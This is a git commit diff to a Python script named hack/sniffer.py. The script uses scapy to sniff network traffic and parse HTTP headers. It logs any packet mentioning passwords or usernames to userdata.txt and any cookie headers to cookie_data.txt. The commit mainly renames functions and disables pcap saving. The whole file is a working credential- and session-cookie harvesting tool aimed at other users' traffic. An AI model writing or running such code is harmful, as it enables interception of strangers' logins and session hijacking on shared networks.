4109644b94ef718240e809ec4379982b9010913c
Nyloner <nyloner.root@gmail.com>
2016-10-12 20:02:04 +0800

    update sniffer

--- hack/sniffer.py
+++ hack/sniffer.py
@@ -4,7 +4,7 @@ import json
 from scapy.utils import PcapReader, PcapWriter
 #sniff(filter="",iface='any',prn=function,count=N)
 
-def getHttpHeaders(http_payload):
+def get_http_header(http_payload):
     try:
         headers=dict(re.findall(r'\r\n(.*?): (.*?)\r\n',http_payload))
         if headers=={}:
@@ -13,7 +13,7 @@ def getHttpHeaders(http_payload):
         return None
     return headers
 
-def baseInfor(packet,data):
+def base_infor(packet,data):
     try:
         baseinfor='%s<==>%s\n'%(packet[IP].dst,packet[IP].src)
     except:
@@ -21,16 +21,15 @@ def baseInfor(packet,data):
     baseinfor+=data.split('\r\n\r\n')[0]
     return baseinfor
 
-def getUser(packet,baseinfor):
+def save_user_data(packet,baseinfor):
     f=open('userdata.txt','a')
     f.write(baseinfor+'\n')
     f.write("Data:{}".format(packet[IP].payload)+'\n\n\n')
     f.close()
 
-def get_cookie(packet,baseinfor):
+def save_cookie_data(baseinfor):
     f=open('cookie_data.txt','a')
-    f.write(baseinfor+'\n')
-    f.write("Data:{}".format(packet[IP].payload)+'\n\n\n')
+    f.write(baseinfor+'\n\n\n')
     f.close()
 
 def packet_callback(packet):
@@ -39,16 +38,16 @@ def packet_callback(packet):
     except:
         return
     data=packet[TCP].load.decode('utf-8','ignore')
-    headers=getHttpHeaders(data)
+    headers=get_http_header(data)
     if headers==None:
         return
-    baseinfor=baseInfor(packet,data)
+    baseinfor=base_infor(packet,data)
     print(baseinfor,'\n-----')
     passwd_packet=str(packet[TCP].payload)
     if  'password' in passwd_packet.lower() or 'passwd' in passwd_packet.lower() or 'pwd' in passwd_packet.lower() or 'username' in passwd_packet.lower():
-        getUser(packet,baseinfor)
-    if 'Cookie' in passwd_packet.lower():
-        get_cookie(packet,baseinfor)
+        save_user_data(packet,baseinfor)
+    if 'Cookie' in baseinfor:
+        save_cookie_data(baseinfor)
     '''
     writer=PcapWriter('data.pcap', append = True)
     writer.write(packet)
@@ -61,7 +60,7 @@ while True:
         packets=sniff(filter='',prn=packet_callback,count=10000)
     except KeyboardInterrupt:
         pcapname=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))
-        wrpcap('pcap/%s.pcap'%pcapname,packets)
+        #wrpcap('pcap/%s.pcap'%pcapname,packets)
         break
-    pcapname=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))
-    wrpcap('pcap/%s.pcap'%pcapname,packets)
+    #pcapname=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))
+    #wrpcap('pcap/%s.pcap'%pcapname,packets)
